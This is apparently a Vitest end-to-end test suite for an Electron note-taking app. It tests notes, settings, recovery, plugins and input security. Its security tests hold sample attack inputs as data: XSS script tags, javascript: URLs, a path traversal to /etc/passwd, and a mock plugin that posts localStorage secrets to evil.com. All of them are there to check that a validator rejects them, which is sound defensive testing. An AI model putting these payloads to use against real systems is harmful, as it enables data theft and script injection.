/**
 * End-to-End Tests for Critical Workflows
 * Tests complete user journeys and system integration
 */

import { vi, describe, it, expect, beforeEach, afterEach } from 'vitest'

// Mock DOM and browser APIs for E2E testing
const mockLocalStorage = {
  getItem: vi.fn(),
  setItem: vi.fn(),
  removeItem: vi.fn(),
  clear: vi.fn(),
}

const mockIndexedDB = {
  open: vi.fn(),
  deleteDatabase: vi.fn(),
}

const mockElectronAPI = {
  isElectron: true,
  writeFile: vi.fn(),
  readFile: vi.fn(),
  readdir: vi.fn(),
  mkdir: vi.fn(),
  stat: vi.fn(),
  showContextMenu: vi.fn(),
  getPlatform: vi.fn().mockReturnValue('darwin'),
  getAppVersion: vi.fn().mockReturnValue('1.5.0'),
}

// Setup global mocks
Object.defineProperty(global, 'localStorage', {
  value: mockLocalStorage,
  writable: true,
})

Object.defineProperty(global, 'indexedDB', {
  value: mockIndexedDB,
  writable: true,
})

Object.defineProperty(global, 'window', {
  value: {
    electronAPI: mockElectronAPI,
    location: { href: 'http://localhost:5173' },
    navigator: { userAgent: 'Test Browser' },
    addEventListener: vi.fn(),
    removeEventListener: vi.fn(),
    dispatchEvent: vi.fn(),
  },
  writable: true,
})

// Mock fetch for network operations
global.fetch = vi.fn()

describe('Critical Workflows E2E Tests', () => {
  beforeEach(() => {
    vi.clearAllMocks()

    // Setup default mock responses
    mockLocalStorage.getItem.mockReturnValue(null)
    mockElectronAPI.readFile.mockResolvedValue('[]')
    mockElectronAPI.readdir.mockResolvedValue([])
    mockElectronAPI.writeFile.mockResolvedValue(undefined)
    mockElectronAPI.stat.mockResolvedValue({ isDirectory: () => false })
  })

  afterEach(() => {
    vi.restoreAllMocks()
  })

  describe('Application Initialization Workflow', () => {
    it('should complete full initialization sequence', async () => {
      // Mock initial data
      const mockNotes = [
        {
          id: '1',
          title: 'Welcome Note',
          content: 'Welcome to the application!',
          createdAt: new Date().toISOString(),
          updatedAt: new Date().toISOString(),
          tags: ['welcome'],
          notebook: 'default',
        },
      ]

      const mockSettings = {
        theme: 'light',
        fontSize: 14,
        lineHeight: 1.6,
        editorMode: 'split',
      }

      mockElectronAPI.readFile
        .mockResolvedValueOnce(JSON.stringify(mockNotes)) // notes
        .mockResolvedValueOnce(JSON.stringify(mockSettings)) // settings

      // Simulate app initialization
      const { AppInitializationService } = await import(
        '../../services/AppInitializationService'
      )
      const initService = new AppInitializationService()

      const mockDependencies = {
        loadNotes: vi.fn(),
        loadSettings: vi.fn(),
        setLoading: vi.fn(),
        setError: vi.fn(),
        setNotes: vi.fn(),
        loadTagColors: vi.fn(),
        updateSettings: vi.fn(),
      }

      const result = await initService.initialize(mockDependencies)

      expect(result.success).toBe(true)
      expect(mockDependencies.setLoading).toHaveBeenCalledWith(true)
      expect(mockDependencies.setLoading).toHaveBeenCalledWith(false)
      expect(mockDependencies.setError).toHaveBeenCalledWith(null)
    })

    it('should handle initialization failures gracefully', async () => {
      // Mock initialization failure
      mockElectronAPI.readFile.mockRejectedValue(
        new Error('Storage not available')
      )

      const { AppInitializationService } = await import(
        '../../services/AppInitializationService'
      )
      const initService = new AppInitializationService()

      const mockDependencies = {
        loadNotes: vi.fn(),
        loadSettings: vi.fn(),
        setLoading: vi.fn(),
        setError: vi.fn(),
        setNotes: vi.fn(),
        loadTagColors: vi.fn(),
        updateSettings: vi.fn(),
      }

      const result = await initService.initialize(mockDependencies)

      expect(result.success).toBe(false)
      expect(result.error).toBeDefined()
      expect(mockDependencies.setError).toHaveBeenCalledWith(expect.any(Error))
    })

    it('should run security audit during initialization', async () => {
      const { SecurityService } = await import('../../services/SecurityService')

      // Mock successful initialization
      mockElectronAPI.readFile.mockResolvedValue('[]')

      const securityService = SecurityService.getInstance()
      const auditSpy = vi.spyOn(securityService, 'performSecurityAudit')

      // Simulate app init with security check
      const audit = securityService.performSecurityAudit()

      expect(auditSpy).toHaveBeenCalled()
      expect(audit.passed).toBe(true)
      expect(audit.checks.length).toBeGreaterThan(0)
    })
  })

  describe('Note Management Workflow', () => {
    it('should complete note creation workflow', async () => {
      const { createEnhancedDocumentRepository } = await import(
        '../../lib/repositories/RepositoryFactory'
      )

      const repository = createEnhancedDocumentRepository()
      await repository.initialize()

      const newNote = {
        id: 'new-note-1',
        title: 'Test Note',
        content: '# Test Note\n\nThis is a test note.',
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
        tags: ['test'],
        notebook: 'default',
      }

      mockElectronAPI.writeFile.mockResolvedValue(undefined)

      const result = await repository.createNote(newNote)

      expect(result).toEqual(newNote)
      expect(mockElectronAPI.writeFile).toHaveBeenCalled()
    })

    it('should complete note update workflow with validation', async () => {
      const { SecurityService } = await import('../../services/SecurityService')
      const { createEnhancedDocumentRepository } = await import(
        '../../lib/repositories/RepositoryFactory'
      )

      const securityService = SecurityService.getInstance()
      const repository = createEnhancedDocumentRepository()
      await repository.initialize()

      const noteUpdate = {
        id: 'existing-note',
        title: 'Updated Note',
        content: '<script>alert("xss")</script>Safe content',
        updatedAt: new Date().toISOString(),
      }

      // Validate content security
      const validation = securityService.validateInput(noteUpdate.content, {
        type: 'html',
      })
      expect(validation.sanitized).toBeDefined()
      expect(validation.sanitized).not.toContain('<script>')

      // Update with sanitized content
      const sanitizedNote = {
        ...noteUpdate,
        content: validation.sanitized || noteUpdate.content,
      }

      mockElectronAPI.writeFile.mockResolvedValue(undefined)
      mockElectronAPI.readFile.mockResolvedValue(
        JSON.stringify([sanitizedNote])
      )

      const result = await repository.updateNote(
        sanitizedNote.id,
        sanitizedNote
      )

      expect(result.content).not.toContain('<script>')
      expect(mockElectronAPI.writeFile).toHaveBeenCalled()
    })

    it('should handle note deletion workflow', async () => {
      const { createEnhancedDocumentRepository } = await import(
        '../../lib/repositories/RepositoryFactory'
      )

      const repository = createEnhancedDocumentRepository()
      await repository.initialize()

      const noteId = 'note-to-delete'

      mockElectronAPI.readFile.mockResolvedValue(
        JSON.stringify([
          { id: 'note-1', title: 'Keep this' },
          { id: noteId, title: 'Delete this' },
          { id: 'note-3', title: 'Keep this too' },
        ])
      )

      mockElectronAPI.writeFile.mockResolvedValue(undefined)

      await repository.deleteNote(noteId)

      expect(mockElectronAPI.writeFile).toHaveBeenCalled()

      // Verify the write call doesn't include the deleted note
      const writeCall = mockElectronAPI.writeFile.mock.calls[0]
      const writtenData = JSON.parse(writeCall[1])
      expect(
        writtenData.find((note: any) => note.id === noteId)
      ).toBeUndefined()
    })
  })

  describe('Settings Management Workflow', () => {
    it('should complete settings update workflow', async () => {
      const { createEnhancedDocumentRepository } = await import(
        '../../lib/repositories/RepositoryFactory'
      )

      const repository = createEnhancedDocumentRepository()
      await repository.initialize()

      const settingsUpdate = {
        theme: 'dark',
        fontSize: 16,
        editorMode: 'preview',
        enablePlugins: true,
      }

      mockElectronAPI.writeFile.mockResolvedValue(undefined)

      await repository.saveSettings(settingsUpdate)

      expect(mockElectronAPI.writeFile).toHaveBeenCalled()

      const writeCall = mockElectronAPI.writeFile.mock.calls[0]
      const savedSettings = JSON.parse(writeCall[1])
      expect(savedSettings).toEqual(settingsUpdate)
    })

    it('should validate settings before saving', async () => {
      const { SecurityService } = await import('../../services/SecurityService')
      const securityService = SecurityService.getInstance()

      const potentiallyUnsafeSettings = {
        theme: 'dark',
        customCSS:
          '<style>body { background: url("javascript:alert(1)"); }</style>',
        pluginUrls: [
          'javascript:alert("xss")',
          'https://safe-plugin.com/plugin.js',
        ],
      }

      // Validate CSS content
      const cssValidation = securityService.validateInput(
        potentiallyUnsafeSettings.customCSS,
        { type: 'html' }
      )
      expect(cssValidation.isValid).toBe(true)
      expect(cssValidation.sanitized).not.toContain('javascript:')

      // Validate plugin URLs
      const urlValidations = potentiallyUnsafeSettings.pluginUrls.map(url =>
        securityService.validateInput(url, { type: 'url' })
      )

      expect(urlValidations[0].isValid).toBe(false) // javascript: URL should be invalid
      expect(urlValidations[1].isValid).toBe(true) // HTTPS URL should be valid
    })
  })

  describe('Error Recovery Workflow', () => {
    it('should recover from storage corruption', async () => {
      const { StorageRecoveryService } = await import(
        '../../services/StorageRecoveryService'
      )

      // Mock corrupted data
      mockElectronAPI.readFile.mockResolvedValueOnce('corrupted json data{[')

      const recoveryService = new StorageRecoveryService()
      const isCorrupted = await recoveryService.detectStorageCorruption('notes')

      expect(isCorrupted).toBe(true)

      // Mock backup data
      mockElectronAPI.readFile.mockResolvedValueOnce(
        JSON.stringify([
          {
            id: '1',
            title: 'Recovered Note',
            content: 'This note was recovered',
          },
        ])
      )

      const recovered = await recoveryService.recoverFromBackup('notes')
      expect(recovered).toBe(true)
    })

    it('should handle network errors with retry', async () => {
      const { NetworkResilienceService } = await import(
        '../../services/NetworkResilienceService'
      )

      let attemptCount = 0
      const mockNetworkOperation = vi.fn().mockImplementation(() => {
        attemptCount++
        if (attemptCount < 3) {
          return Promise.reject(new Error('Network timeout'))
        }
        return Promise.resolve({ data: 'success' })
      })

      const resilienceService = new NetworkResilienceService()
      const result = await resilienceService.executeWithRetry(() =>
        mockNetworkOperation()
      )

      expect(result.data).toBe('success')
      expect(attemptCount).toBe(3)
    })

    it('should provide graceful error boundaries', async () => {
      // Simulate component error and recovery
      const mockComponentState = {
        hasError: false,
        error: null,
        retryCount: 0,
      }

      // Simulate error occurrence
      const simulateError = (error: Error) => {
        mockComponentState.hasError = true
        mockComponentState.error = error
      }

      // Simulate retry mechanism
      const simulateRetry = () => {
        mockComponentState.retryCount++
        if (mockComponentState.retryCount >= 3) {
          mockComponentState.hasError = false
          mockComponentState.error = null
          return true
        }
        return false
      }

      simulateError(new Error('Component crashed'))
      expect(mockComponentState.hasError).toBe(true)

      // Attempt retries
      expect(simulateRetry()).toBe(false) // First retry
      expect(simulateRetry()).toBe(false) // Second retry
      expect(simulateRetry()).toBe(true) // Third retry succeeds

      expect(mockComponentState.hasError).toBe(false)
    })
  })

  describe('Security Workflow', () => {
    it('should complete security validation workflow', async () => {
      const { SecurityService } = await import('../../services/SecurityService')

      const securityService = SecurityService.getInstance()

      // Test comprehensive security audit
      const audit = securityService.performSecurityAudit()
      expect(audit.passed).toBe(true)

      // Test input validation
      const validation = securityService.validateInput(
        '<script>alert("xss")</script>Safe content',
        {
          type: 'html',
        }
      )

      expect(validation.isValid).toBe(true)
      expect(validation.sanitized).toBeDefined()
      expect(validation.sanitized).not.toContain('<script>')

      // Test metrics collection
      const metrics = securityService.getSecurityMetrics()
      expect(metrics.cspEnabled).toBe(true)
      expect(metrics.validationEnabled).toBe(true)
    })

    it('should handle security violations', async () => {
      const { SecurityService } = await import('../../services/SecurityService')

      const securityService = SecurityService.getInstance()
      const initialMetrics = securityService.getSecurityMetrics()

      // Simulate security violation
      const maliciousInputs = [
        'SELECT * FROM users WHERE id = 1',
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        '../../etc/passwd',
      ]

      maliciousInputs.forEach(input => {
        const validation = securityService.validateInput(input)
        if (!validation.isValid) {
          // Violation detected and logged
          expect(validation.errors.length).toBeGreaterThan(0)
        }
      })

      const finalMetrics = securityService.getSecurityMetrics()
      expect(finalMetrics.violationCount).toBeGreaterThanOrEqual(
        initialMetrics.violationCount
      )
    })
  })

  describe('Plugin System Workflow', () => {
    it('should complete plugin installation workflow', async () => {
      const { PluginService } = await import('../../services/PluginService')
      const { SecurityService } = await import('../../services/SecurityService')

      const pluginService = new PluginService()
      const securityService = SecurityService.getInstance()

      const mockPlugin = {
        id: 'test-plugin',
        name: 'Test Plugin',
        version: '1.0.0',
        url: 'https://safe-plugin.com/plugin.js',
        code: 'console.log("Hello from plugin");',
        permissions: ['read'],
      }

      // Validate plugin URL
      const urlValidation = securityService.validateInput(mockPlugin.url, {
        type: 'url',
      })
      expect(urlValidation.isValid).toBe(true)

      // Validate plugin code (basic check)
      const codeValidation = securityService.validateInput(mockPlugin.code, {
        type: 'text',
      })
      expect(codeValidation.isValid).toBe(true)

      // Mock plugin installation
      mockElectronAPI.writeFile.mockResolvedValue(undefined)

      const installed = await pluginService.installPlugin(mockPlugin)
      expect(installed).toBe(true)
      expect(mockElectronAPI.writeFile).toHaveBeenCalled()
    })

    it('should reject malicious plugins', async () => {
      const { SecurityService } = await import('../../services/SecurityService')

      const securityService = SecurityService.getInstance()

      const maliciousPlugin = {
        id: 'malicious-plugin',
        name: 'Malicious Plugin',
        version: '1.0.0',
        url: 'javascript:alert("xss")',
        code: 'fetch("https://evil.com/steal", {method: "POST", body: localStorage.getItem("secrets")});',
        permissions: ['read', 'write', 'network'],
      }

      // Validate plugin URL - should fail
      const urlValidation = securityService.validateInput(maliciousPlugin.url, {
        type: 'url',
      })
      expect(urlValidation.isValid).toBe(false)

      // Validate plugin code - should detect malicious patterns
      const codeValidation = securityService.validateInput(
        maliciousPlugin.code,
        { type: 'text' }
      )
      expect(codeValidation.isValid).toBe(false)
    })
  })

  describe('Performance Monitoring Workflow', () => {
    it('should monitor application performance', async () => {
      const performanceMetrics = {
        appInitTime: 0,
        noteLoadTime: 0,
        searchTime: 0,
        renderTime: 0,
      }

      // Simulate app initialization timing
      const initStart = performance.now()
      await new Promise(resolve => setTimeout(resolve, 10)) // Simulate init work
      performanceMetrics.appInitTime = performance.now() - initStart

      expect(performanceMetrics.appInitTime).toBeGreaterThan(0)
      expect(performanceMetrics.appInitTime).toBeLessThan(1000) // Should be under 1 second

      // Simulate note loading timing
      const loadStart = performance.now()
      mockElectronAPI.readFile.mockResolvedValue(
        JSON.stringify([
          { id: '1', title: 'Note 1' },
          { id: '2', title: 'Note 2' },
        ])
      )

      const notes = JSON.parse(await mockElectronAPI.readFile())
      performanceMetrics.noteLoadTime = performance.now() - loadStart

      expect(notes.length).toBe(2)
      expect(performanceMetrics.noteLoadTime).toBeLessThan(100) // Should be very fast for mock
    })

    it('should detect performance regressions', async () => {
      const performanceBaseline = {
        maxInitTime: 2000,
        maxLoadTime: 500,
        maxSearchTime: 200,
      }

      // Simulate performance measurements
      const measurements = {
        initTime: 500,
        loadTime: 100,
        searchTime: 50,
      }

      expect(measurements.initTime).toBeLessThan(
        performanceBaseline.maxInitTime
      )
      expect(measurements.loadTime).toBeLessThan(
        performanceBaseline.maxLoadTime
      )
      expect(measurements.searchTime).toBeLessThan(
        performanceBaseline.maxSearchTime
      )
    })
  })

  describe('Data Integrity Workflow', () => {
    it('should maintain data consistency across operations', async () => {
      const { createEnhancedDocumentRepository } = await import(
        '../../lib/repositories/RepositoryFactory'
      )

      const repository = createEnhancedDocumentRepository()
      await repository.initialize()

      const initialNotes = [
        { id: '1', title: 'Note 1', content: 'Content 1' },
        { id: '2', title: 'Note 2', content: 'Content 2' },
      ]

      mockElectronAPI.readFile.mockResolvedValue(JSON.stringify(initialNotes))
      mockElectronAPI.writeFile.mockResolvedValue(undefined)

      const notes = await repository.getNotes()
      expect(notes.length).toBe(2)

      // Add a note
      const newNote = { id: '3', title: 'Note 3', content: 'Content 3' }
      await repository.createNote(newNote)

      // Verify data consistency
      const writeCall = mockElectronAPI.writeFile.mock.calls[0]
      const savedNotes = JSON.parse(writeCall[1])
      expect(savedNotes.length).toBe(3)
      expect(savedNotes.find((note: any) => note.id === '3')).toBeDefined()
    })

    it('should handle concurrent operations safely', async () => {
      const { createEnhancedDocumentRepository } = await import(
        '../../lib/repositories/RepositoryFactory'
      )

      const repository = createEnhancedDocumentRepository()
      await repository.initialize()

      mockElectronAPI.readFile.mockResolvedValue(JSON.stringify([]))
      mockElectronAPI.writeFile.mockResolvedValue(undefined)

      // Simulate concurrent note creation
      const concurrentOperations = [
        repository.createNote({
          id: '1',
          title: 'Note 1',
          content: 'Content 1',
        }),
        repository.createNote({
          id: '2',
          title: 'Note 2',
          content: 'Content 2',
        }),
        repository.createNote({
          id: '3',
          title: 'Note 3',
          content: 'Content 3',
        }),
      ]

      const results = await Promise.all(concurrentOperations)

      expect(results.length).toBe(3)
      expect(mockElectronAPI.writeFile).toHaveBeenCalled()

      // All operations should succeed
      results.forEach(result => {
        expect(result).toBeDefined()
        expect(result.id).toBeDefined()
      })
    })
  })
})
